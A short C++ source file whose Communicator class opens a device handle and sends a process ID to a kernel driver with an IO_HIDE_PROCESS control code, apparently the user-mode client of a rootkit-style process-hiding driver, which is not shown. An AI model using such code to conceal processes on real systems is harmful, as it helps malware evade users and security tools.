#include "Communicator.h"

bool Communicator::hideTask(DWORD pid)
{
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("IO_HIDE_PROCESS: %d\n", IO_HIDE_PROCESS);
		printf("Driver not found\n");
		return false;
	}

	BYTE outputBuffer;

	DWORD Bytes;

	if (DeviceIoControl(hDriver, IO_HIDE_PROCESS, &pid, sizeof(pid), &outputBuffer, sizeof(outputBuffer), &Bytes, NULL))
	{
		return true;
	}

	return false;
}

Communicator::Communicator(LPCSTR RegistryPath)
{
	hDriver = CreateFileA(RegistryPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
}